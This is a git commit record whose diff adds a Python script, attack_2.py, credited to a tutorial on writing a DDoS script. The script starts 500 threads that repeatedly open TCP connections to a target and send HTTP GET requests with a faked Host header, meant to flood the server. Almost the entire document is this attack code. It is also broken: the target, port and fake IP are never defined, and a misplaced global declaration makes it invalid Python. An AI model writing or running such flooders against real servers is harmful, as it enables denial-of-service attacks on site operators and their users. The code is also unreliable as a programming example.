05217d5f7b6d089b07c3da57c6c4638c80d70b73
Avi Parshan <avipars@users.noreply.github.com>
2022-09-07 19:32:14 +0300

    dd

--- attack_2.py
+++ attack_2.py
@@ -1,3 +1,28 @@
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
+import socket
+import threading
+
+#https://www.neuralnine.com/code-a-ddos-script-in-python/
+
+def attack():
+    attack_num = 0
+
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
+
+
+def main():
+    for i in range(500):
+        thread = threading.Thread(target=attack)
+        thread.start()
+
+if __name__ == "__main__":
+    main()
